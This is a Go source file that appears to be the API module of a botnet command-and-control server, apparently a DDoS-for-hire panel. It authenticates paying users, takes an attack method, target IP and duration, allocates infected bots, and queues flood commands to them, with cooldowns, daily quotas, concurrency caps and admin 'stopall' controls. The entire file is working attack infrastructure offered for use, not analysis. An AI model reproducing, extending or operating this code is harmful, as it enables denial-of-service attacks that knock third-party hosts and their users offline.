package main

import (
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "regexp"
    "strconv"
    "strings"
    "sync"
    "time"
)

var (
    ipRegex       = regexp.MustCompile(`^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`)
    lastAttackTime = make(map[string]time.Time)
    rateLimitTime  = make(map[string]time.Time)
    activeAttacks  = make(map[string][]string)
    mutex          = sync.Mutex{}
)

func isValidIP(ip string) bool {
    return ipRegex.MatchString(ip)
}

func StartAPIServer() {
    http.HandleFunc("/attack/raw/v3", handleAttack)
    fmt.Println("API server started on port 778")
    if err := http.ListenAndServe(":778", nil); err != nil {
        fmt.Println("Failed to start API server:", err)
    }
}

func handleAttack(w http.ResponseWriter, r *http.Request) {
    startTime := time.Now()
    w.Header().Set("Content-Type", "application/json")

    if !database.globalApiEnabled {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Global API is disabled"}, http.StatusForbidden)
        return
    }

    params := r.URL.Query()
    username := params.Get("username")
    password := params.Get("password")
    target := params.Get("target")
    durationStr := params.Get("duration")
    method := strings.ToLower(params.Get("method"))

    if username == "" || password == "" {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Missing username or password"}, http.StatusBadRequest)
        return
    }

    loggedIn, userInfo, errMsg := database.TryLogin(username, password)
    if !loggedIn {
        respondJSON(w, map[string]interface{}{"error": true, "message": errMsg}, http.StatusUnauthorized)
        return
    }

    if !userInfo.Api {
        respondJSON(w, map[string]interface{}{"error": true, "message": "API access denied for this user"}, http.StatusForbidden)
        return
    }

    if method == "" {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Missing method parameter"}, http.StatusBadRequest)
        return
    }

    if strings.Contains(method, "http") {
        respondJSON(w, map[string]interface{}{
            "error":   true,
            "message": "HTTP attacks not allowed on api",
        }, http.StatusForbidden)
        return
    }

    if strings.Contains(method, "home") {
        respondJSON(w, map[string]interface{}{
            "error":   true,
            "message": "HOME attacks not allowed on api",
        }, http.StatusForbidden)
        return
    }

    if method == "stop" || method == "stopall" {
        if method == "stopall" && !userInfo.Admin {
            respondJSON(w, map[string]interface{}{"error": true, "message": "Admin access required for stopall command"}, http.StatusForbidden)
            return
        }

        atk, _, err := NewAttack(method, userInfo.Admin)
        if err != nil {
            respondJSON(w, map[string]interface{}{"error": true, "message": err.Error()}, http.StatusBadRequest)
            return
        }

        buf, err := atk.Build()
        if err != nil {
            respondJSON(w, map[string]interface{}{"error": true, "message": err.Error()}, http.StatusInternalServerError)
            return
        }

        if method == "stopall" {
            // Stop all attacks (admin only)
            allBots := []int{}
            database.mutex.Lock()
            for uid := range database.availableBots {
                allBots = append(allBots, uid)
            }
            // Free all bots and clear all attacks
            for _, attack := range database.attacks {
                for _, uid := range attack.AssignedBotUIDs {
                    database.availableBots[uid] = true
                }
            }
            database.attacks = []AttackRecord{}
            database.mutex.Unlock()

            clientList.QueueBuf(buf, allBots, "")
            response := map[string]interface{}{
                "error":          false,
                "message":        "All running attacks stopped",
                "bots_affected":  len(allBots),
                "time_to_send":   fmt.Sprintf("%.6fms", float64(time.Since(startTime).Nanoseconds())/1e6),
                "running_attacks": "0",
                "daily":          fmt.Sprintf("%d/%d", userInfo.DailyAttackCount, userInfo.DailyAttackMax),
            }
            respondJSON(w, response, http.StatusOK)
        } else { // method == "stop"
            // Stop only the user's attacks
            database.mutex.Lock()
            var botsToStop []int
            currentTime := time.Now().Unix()
            var remainingAttacks []AttackRecord
            for _, attack := range database.attacks {
                if attack.Username == username && attack.StartTime+int64(attack.Duration) > currentTime {
                    botsToStop = append(botsToStop, attack.AssignedBotUIDs...)
                    for _, uid := range attack.AssignedBotUIDs {
                        database.availableBots[uid] = true
                    }
                } else {
                    remainingAttacks = append(remainingAttacks, attack)
                }
            }
            database.attacks = remainingAttacks
            database.mutex.Unlock()

            if len(botsToStop) > 0 {
                clientList.QueueBuf(buf, botsToStop, "")
            }
            response := map[string]interface{}{
                "error":          false,
                "message":        "Your running attacks stopped",
                "bots_affected":  len(botsToStop),
                "time_to_send":   fmt.Sprintf("%.6fms", float64(time.Since(startTime).Nanoseconds())/1e6),
                "running_attacks": fmt.Sprintf("%d", len(database.GetActiveAttacks(username))),
                "daily":          fmt.Sprintf("%d/%d", userInfo.DailyAttackCount, userInfo.DailyAttackMax),
            }
            respondJSON(w, response, http.StatusOK)
        }
        return
    }

    // Remaining code for launching attacks
    if target == "" || durationStr == "" {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Missing target or duration"}, http.StatusBadRequest)
        return
    }

    duration, err := strconv.Atoi(durationStr)
    if err != nil || duration <= 0 {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Invalid duration"}, http.StatusBadRequest)
        return
    }

    atkInfo, exists := attackInfoLookup[method]
    if !exists {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Invalid method"}, http.StatusBadRequest)
        return
    }
    if !isValidIP(target) {
        respondJSON(w, map[string]interface{}{"error": true, "message": "Invalid target"}, http.StatusBadRequest)
        return
    }

    if userInfo.DurationLimit != 0 && duration > userInfo.DurationLimit {
        respondJSON(w, map[string]interface{}{"error": true, "message": fmt.Sprintf("Max duration is %d seconds", userInfo.DurationLimit)}, http.StatusBadRequest)
        return
    }

    database.mutex.Lock()
    currentTimeUnix := time.Now().Unix()
    conflict := false
    for _, attack := range database.attacks {
        if attack.StartTime+int64(attack.Duration) > currentTimeUnix {
            existingTarget := extractTarget(attack.Command)
            if existingTarget == target {
                conflict = true
                break
            }
        }
    }
    database.mutex.Unlock()
    if conflict && !userInfo.PowersavingBypass && !userInfo.Admin {
        log.Printf("Blocked API attack from %s to %s: Target already under attack", username, target)
        respondJSON(w, map[string]interface{}{"error": true, "message": "An attack is already active on this IP"}, http.StatusConflict)
        return
    }

    mutex.Lock()
    currentTime := time.Now()
    if t, exists := rateLimitTime[username]; exists && currentTime.Sub(t).Seconds() < 1 {
        wait := 1 - currentTime.Sub(t).Seconds()
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": fmt.Sprintf("Rate limit. Wait %.2fs", wait)}, http.StatusTooManyRequests)
        return
    }

    if t, exists := lastAttackTime[username]; exists && currentTime.Sub(t).Seconds() < float64(userInfo.Cooldown) {
        remaining := float64(userInfo.Cooldown) - currentTime.Sub(t).Seconds()
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": fmt.Sprintf("Cooldown. Wait %.0fs", remaining)}, http.StatusTooManyRequests)
        return
    }

    active := database.GetActiveAttacks(username)
    if userInfo.Conns == 0 || (userInfo.Conns > 0 && len(active) >= userInfo.Conns) {
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": "You have reached your max concurrent attacks"}, http.StatusBadRequest)
        return
    }
    runningAttacks := database.fetchRunningAttacks()
    if runningAttacks >= database.globalMaxConcurrentAttacks {
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": "Max global concurrent attacks reached"}, http.StatusBadRequest)
        return
    }

    flags := []string{}
    allowedFlagIDs := atkInfo.attackFlags
    for flagName, flagInfo := range flagInfoLookup {
        if uint8InSlice(flagInfo.flagID, allowedFlagIDs) {
            if value := params.Get(flagName); value != "" {
                flags = append(flags, fmt.Sprintf("%s=%s", flagName, value))
            }
        }
    }
    if bots := params.Get("bots"); bots != "" {
        flags = append(flags, fmt.Sprintf("bots=%s", bots))
    }

    command := fmt.Sprintf("%s %s %d %s", method, target, duration, strings.Join(flags, " "))
    atk, specifiedBots, err := NewAttack(command, userInfo.Admin)
    if err != nil {
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": err.Error()}, http.StatusBadRequest)
        return
    }

    // Determine bot count with global concurrent attack cap
    database.mutex.Lock()
    availableBots := len(database.availableBots)
    maxBotsPerAttack := availableBots
    if database.globalMaxConcurrentAttacks > 0 {
        maxBotsPerAttack = availableBots / database.globalMaxConcurrentAttacks
    }
    database.mutex.Unlock()
    botCount := userInfo.MaxBots
    if specifiedBots > 0 && (userInfo.MaxBots == -1 || specifiedBots < userInfo.MaxBots) {
        botCount = specifiedBots
        if userInfo.MaxBots == -1 && botCount > maxBotsPerAttack {
            botCount = maxBotsPerAttack
        }
    } else if userInfo.MaxBots == -1 {
        botCount = maxBotsPerAttack
    }

    buf, err := atk.Build()
    if err != nil {
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": err.Error()}, http.StatusInternalServerError)
        return
    }

    can, assignedBots, err := database.CanLaunchAttack(username, atk.Duration, command, botCount)
    if !can {
        mutex.Unlock()
        respondJSON(w, map[string]interface{}{"error": true, "message": err.Error()}, http.StatusForbidden)
        return
    }

    clientList.QueueBuf(buf, assignedBots, "")
    rateLimitTime[username] = currentTime
    lastAttackTime[username] = currentTime
    if _, exists := activeAttacks[username]; !exists {
        activeAttacks[username] = []string{}
    }
    activeAttacks[username] = append(activeAttacks[username], target)
    mutex.Unlock()

    go func() {
        time.Sleep(time.Duration(duration) * time.Second)
        mutex.Lock()
        if targets, exists := activeAttacks[username]; exists {
            for i, t := range targets {
                if t == target {
                    activeAttacks[username] = append(targets[:i], targets[i+1:]...)
                    break
                }
            }
            if len(activeAttacks[username]) == 0 {
                delete(activeAttacks, username)
            }
        }
        mutex.Unlock()
    }()

    response := map[string]interface{}{
        "error":           false,
        "target":          target,
        "duration":        durationStr,
        "method_used":     method,
        "flags":           flags,
        "time_to_send":    fmt.Sprintf("%.6fms", float64(time.Since(startTime).Nanoseconds())/1e6),
        "running_attacks": fmt.Sprintf("%d/%d", len(database.GetActiveAttacks(username)), userInfo.Conns),
        "daily":           fmt.Sprintf("%d/%d", userInfo.DailyAttackCount, userInfo.DailyAttackMax),
    }
    respondJSON(w, response, http.StatusOK)
}

func respondJSON(w http.ResponseWriter, data interface{}, status int) {
    w.WriteHeader(status)
    json.NewEncoder(w).Encode(data)
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}
